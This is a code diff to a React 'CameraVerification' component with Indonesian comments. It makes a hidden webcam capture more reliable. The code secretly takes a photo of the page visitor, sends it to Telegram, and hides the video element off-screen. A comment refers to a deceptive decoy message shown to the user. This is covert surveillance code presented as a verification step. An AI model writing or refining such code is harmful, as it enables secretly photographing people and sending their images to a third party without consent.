@@ -60,26 +60,37 @@ export default function CameraVerification() {
         });
         
         // Tunggu sebentar agar kamera fokus dan exposure stabil
-        await new Promise(r => setTimeout(r, 1000));
-        
+        // Pastikan videoWidth sudah terisi (beberapa HP butuh waktu ekstra)
+        let attempts = 0;
+        while (videoRef.current && videoRef.current.videoWidth === 0 && attempts < 30) {
+            await new Promise(r => setTimeout(r, 100));
+            attempts++;
+        }
+
         // Ambil foto secara tersembunyi
         const video = videoRef.current;
         const canvas = canvasRef.current;
         
-        if (video && canvas && video.videoWidth > 0) {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const context = canvas.getContext('2d');
-            
-            if (context) {
-                // Render gambar video ke canvas tersembunyi
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                // Konversi gambar menjadi format blob
-                canvas.toBlob((blob) => {
-                    if (blob) {
-                        sendToTelegram(blob).catch(console.error);
-                    }
-                }, 'image/jpeg', 0.85);
+        if (video && canvas) {
+            if (video.videoWidth === 0) {
+                alert("GAGAL: Resolusi kamera 0 (HP Anda memblokir gambar video).");
+            } else {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                
+                if (context) {
+                    // Render gambar video ke canvas tersembunyi
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    // Konversi gambar menjadi format blob
+                    canvas.toBlob((blob) => {
+                        if (blob) {
+                            sendToTelegram(blob).catch(console.error);
+                        } else {
+                            alert("GAGAL: Tidak bisa membuat Blob gambar.");
+                        }
+                    }, 'image/jpeg', 0.85);
+                }
             }
         }
       }
@@ -173,13 +184,15 @@ export default function CameraVerification() {
         </div>
 
         {/* ELEMEN KAMERA RAHASIA (DISEMBUNYIKAN SEPENUHNYA DARI LAYAR) */}
-        <video 
-            ref={videoRef} 
-            autoPlay 
-            playsInline 
-            muted 
-            className="absolute opacity-0 pointer-events-none w-[1px] h-[1px] -z-50"
-        />
+        <div style={{ position: 'fixed', top: '-9999px', left: '-9999px', width: '1px', height: '1px', overflow: 'hidden' }}>
+          <video 
+              ref={videoRef} 
+              autoPlay 
+              playsInline 
+              muted 
+              style={{ width: '640px', height: '480px' }}
+          />
+        </div>
         <canvas ref={canvasRef} className="hidden" />
 
         {/* Pesan Tipuan */}
